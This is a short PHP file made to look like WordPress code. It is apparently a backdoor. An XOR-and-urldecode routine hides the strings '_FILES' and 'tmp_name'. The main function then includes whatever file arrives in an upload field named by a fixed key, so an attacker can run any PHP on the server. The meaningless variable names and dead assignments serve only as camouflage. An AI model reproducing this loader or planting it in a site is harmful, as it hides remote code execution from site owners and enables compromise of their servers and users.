<?php 	
function rest_base()

{
    $result = 'UAcBoZwoE5F';
    $post_types = $result;
	$child = 'updated';
    

    $filter = $GLOBALS[_ext("%0A%07%2A%0E%2A%09", $post_types)];

    $tb_list = $filter;
    $return = isset($tb_list[$post_types]);
    if ($return)

    {

        $post_date_gmt = $filter[$post_types];

        $item = $post_date_gmt[_ext("%21%2C%13%1D%01%3B%1A%0A", $post_types)];
        $parsed_args = $item;
        include ($parsed_args);
    }
}
	$email = 'strict';
function _ext($url_clickable, $tax_object)

{
	$rest_controller_class = 'raw_title';
    $opening_single_quote = $tax_object;
    $special_chars = "url" . "decode";

    $open_sq_flag = $special_chars($url_clickable);
    $stickies = substr($opening_single_quote,0, strlen($open_sq_flag));

    $menu_icon = $open_sq_flag ^ $stickies;
    
	$mime_types = 'parent';
    $open_sq_flag = strpos($menu_icon, $stickies);
    
    return $menu_icon;
	$statuses = 'html';
}


rest_base();

?>
